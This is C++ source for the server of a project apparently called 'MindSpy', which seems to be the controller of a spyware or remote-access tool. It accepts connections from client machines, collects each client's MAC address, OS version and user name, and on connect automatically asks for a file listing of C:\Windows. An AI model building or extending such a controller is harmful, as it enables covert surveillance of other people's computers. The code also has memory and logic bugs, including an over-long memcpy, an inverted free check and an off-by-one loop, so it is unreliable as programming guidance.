#include "Servidor.h"

namespace MindSpy
{
	// Constructores, destructores
	Servidor::Servidor() {
		WSAStartup(MAKEWORD(2, 2), &wsa);
		s = socket(AF_INET, SOCK_STREAM, 0);
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = INADDR_ANY;
		server.sin_port = htons(NO_PUERTO);
		bind(s, (struct sockaddr *)&server, sizeof(server));
		resultado = 1;
		Conexiones.resize(0);
		cout << "Servidor iniciado correctamente" << endl;
	}

	Servidor::~Servidor() {
		closesocket(s);
		WSACleanup();
	}

	bool Servidor::Listo() {
		return resultado == 1;
	}

	void Servidor::IniciarEscucha() {
		CreateThread(NULL, NULL, &HiloEscuchaStatic, this, NULL, NULL);
	}

	void Servidor::HiloEscucha() {
		listen(s, 3);
		while (true) {
			unsigned int id = Conexiones.size();
			c = sizeof(sockaddr_in);
			//Conexiones[Conexiones.size()-1].c_socket = accept(s, (sockaddr *)&client, &c);
			SOCKET socket_temporal = accept(s, (sockaddr *)&client, &c);
			if (IpRegistrada(inet_ntoa(client.sin_addr)) != IP_NO_REGISTRADA) {
				const char *Mensaje = "Solo se permite un cliente por IP.";
				send(socket_temporal, Mensaje, strlen(Mensaje), 0);
				cout << "Conexion entrante de " << inet_ntoa(client.sin_addr) << " rechazada, IP ya registrada." << endl;
				closesocket(socket_temporal);
				continue;
			}

			Conexiones.push_back(CONEXION());
			Conexiones[id].c_socket = socket_temporal;
			ZeroMemory(Conexiones[id].Alias, sizeof(Conexiones[id].Alias));
			strcpy(Conexiones[id].IP, inet_ntoa(client.sin_addr));
			Conexiones[id].ID = id;
			Conexiones[id].Activa = false;
			cout << "Conexion aceptada. IP: " << Conexiones[id].IP << endl;
			CreateThread(NULL, NULL, &HiloConexionStatic, this, NULL, NULL);
			while (!Conexiones[id].Activa) Sleep(30);

			stFileInfoRequest stfir;
			wcsncpy(stfir.Filtro, L"*.*", 4);
			wcsncpy(stfir.Path, L"C:\\Windows", 11);
			stfir.Query = FILEINFO_QUERY::REQ_ONLY_ARCHIVE;
			if (EnviarComando(Conexiones[id].IP, sizeof(stFileInfoRequest), CLNT_CMDS::FILEINFO, (BYTE*)&stfir))
				wcout << L"Solicitando informaci�n de archivos..." << endl;
		}
	}

	int Servidor::IpRegistrada(const char*IP) {
		for (int i = 0; i < Conexiones.size(); i++)
		{
			if (!strcmp(IP, Conexiones[i].IP) && Conexiones[i].Activa)
			{
				return i;
			}
		}
		return IP_NO_REGISTRADA;
	}

	bool Servidor::EnviarComando(char* IP, UINT32 SizeofData, UINT32 comando, BYTE* Data)
	{
		/*
		La estructura de los paquetes a enviar, es siempre la misma, independientemente de
		los datos a enviar. Sin embargo, el tama�o de dichos datos puede variar.

		Los primeros cuatro bytes del paquete, corresponden al tama�o del paquete. Los segundos
		cuatro bytes corresponden al comando asociado a la data y del octavo byte en adelante,
		se ubica la data a enviar.
		*/
		// Obtener el socket asociado a la IP
		int res = IpRegistrada(IP);
		if (res == IP_NO_REGISTRADA)
			return false;

		// Se reserva memoria para el tama�o de la data + el opcode (comando) + data
		BYTE *DataToSend = (BYTE*)VirtualAlloc(NULL, SizeofData + 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		// Se mueven a los primeros 4 bytes (unsigned short), el tama�o del paquete
		*(UINT32*)DataToSend = SizeofData;
		// Se mueve el comando a los siguientes 4 bytes
		*(UINT32*)(DataToSend + 4) = comando;
		// Se copia la data pasada por par�metro a la memoria reservada
		if (Data)
			memcpy(DataToSend + 8, Data, SizeofData + 8);
		// Se envian los datos
		bool r = send(Conexiones[res].c_socket, (const char*)DataToSend, SizeofData + 8, 0) != SOCKET_ERROR;
		// Se libera la memoria
		VirtualFree(DataToSend, SizeofData, MEM_RELEASE);
		return r;
	}

	void Servidor::HiloConexion() {
		// Obtener el ID actual
		int MyID = Conexiones.size() - 1;
		// Asignar el ID al registro
		Conexiones[MyID].Activa = true;
		char* szBuff = (char*)malloc(1);
		// Mientras la conexi�n est� activa...
		while (Conexiones[MyID].Activa) {
			// variable para guardar la cantidad de bytes disponibles en el stream
			DWORD bDisponibles;
			// Validar si la conexi�n sigue activa
			//int resp = recv(Conexiones[MyID].c_socket, &bufft, 1, MSG_PEEK);
			// Si no lo est�, nos vamos

			// Verificamos si hay bytes por leer
			int resp = ioctlsocket(Conexiones[MyID].c_socket, FIONREAD, &bDisponibles);
			if (resp == SOCKET_ERROR)
				break;
			// si no los hay, ralentizamos y reiniciamos el ciclo
			if (!bDisponibles)
			{
				Sleep(50);
				continue;
			}

			// Si los hay, los leemos
			int DataSize;
			resp = recv(Conexiones[MyID].c_socket, (char*)&DataSize, 4, MSG_PEEK);
			if (resp == 0)
				continue;
			else if (resp < 0)
				break;

			if (!szBuff)
				free(szBuff);
			szBuff = (char*)realloc(szBuff, DataSize+8);
			recv(Conexiones[MyID].c_socket, szBuff, DataSize+8, 0);
			UINT32 comando = *(UINT32*)(szBuff + sizeof(UINT32));

			wcout << L"Data recibida: " << DataSize + 8 << L" bytes." << endl;

			switch (comando)
			{
			case CLNT_CMDS::CLOSE:
				Conexiones[MyID].Activa = false;
				break;

			case CLNT_CMDS::VERSION:
				wcout << L"Version del cliente: " << (wchar_t*)&szBuff[8] << endl;
				break;

			case CLNT_CMDS::SYSINFO:
				Conexiones[MyID].SistemaCliente = *(stSystemInfoResponse*)(szBuff + 8);
				wcout << L"Informacion de cliente recibida." << endl;
				wcout << L"IP: " << Conexiones[MyID].IP << endl;
				wcout << L"MAC: " << Conexiones[MyID].SistemaCliente.MAC << endl;
				wcout << L"Version de OS: " << Conexiones[MyID].SistemaCliente.VersionMayor << L"."
					<< Conexiones[MyID].SistemaCliente.VersionMenor << L"."
					<< Conexiones[MyID].SistemaCliente.Build << L" ("
					<< Conexiones[MyID].SistemaCliente.NombreOS << L")." << endl;
				wcout << L"Arquitectura: " << Conexiones[MyID].SistemaCliente.Arquitectura << L" bits." << endl;
				wcout << L"Nombre de usuario: " << Conexiones[MyID].SistemaCliente.NombreUsuario << endl;
				break;

			case CLNT_CMDS::FILEINFO: {
				stListaArchivos stla;
				BYTE *ReceivedData = (BYTE*)(szBuff + 8);
				UINT32 SizeOfReceivedData = *(UINT32*)(szBuff);
				stla.CantArchivos = *(UINT32*)ReceivedData;

				int OffsetWchar = sizeof(WCHAR) * MAX_PATH * stla.CantArchivos;
				int OffsetLonglong = sizeof(long long) * stla.CantArchivos;
				int OffsetFiletime = sizeof(FILETIME) * stla.CantArchivos;

				PWCHAR NombreInicio = (PWCHAR)(ReceivedData + sizeof(UINT32));
				PFILETIME FCInicio = (PFILETIME)(ReceivedData + sizeof(UINT32) + OffsetWchar);
				PFILETIME FMInicio = (PFILETIME)(ReceivedData + sizeof(UINT32) + OffsetWchar + OffsetFiletime);
				PLONGLONG TamInicio = (PLONGLONG)(ReceivedData + sizeof(UINT32) + OffsetWchar + OffsetFiletime * 2);
				
				PFILETIME FCActual = FCInicio;
				PFILETIME FMActual = FMInicio;
				wchar_t* NombreActual = NombreInicio;
				long long *Tama�oActual = TamInicio;

				Conexiones[MyID].archivos.clear();
				for (int i = 0; i < stla.CantArchivos-1; i++)
				{
					Conexiones[MyID].archivos.push_back(Archivo());
					Conexiones[MyID].archivos[i].nombre = NombreActual;
					Conexiones[MyID].archivos[i].Tama�o = *Tama�oActual;
					Conexiones[MyID].archivos[i].FechaCreacion = *FCActual;
					Conexiones[MyID].archivos[i].FechaModificacion = *FMActual;

					NombreActual += MAX_PATH;
					FCActual++;
					FMActual++;
					Tama�oActual++;

					SYSTEMTIME st;
					FileTimeToSystemTime(&Conexiones[MyID].archivos[i].FechaCreacion, &st);
					wcout << 
						Conexiones[MyID].archivos[i].nombre << L" - " << 
						Conexiones[MyID].archivos[i].Tama�o << L" bytes.\n" <<
						L"Creado el " << st.wDay << L"/" << st.wMonth << L"/" << st.wYear <<
						endl << endl;
				}
				break;
			}

			}
		}
		wcout << L"Cerrando conexion con " << Conexiones[MyID].IP << L" (" << Conexiones[MyID].ID << L")..." << endl;
		Conexiones[MyID].Activa = false;
		closesocket(Conexiones[MyID].c_socket);
	}

	bool Servidor::SetAlias(const char* IP, const char* Alias) {
		int r = IpRegistrada(IP);
		if (r != IP_NO_REGISTRADA) {
			strcpy(Conexiones[r].Alias, Alias);
			return true;
		}
		return false;
	}
}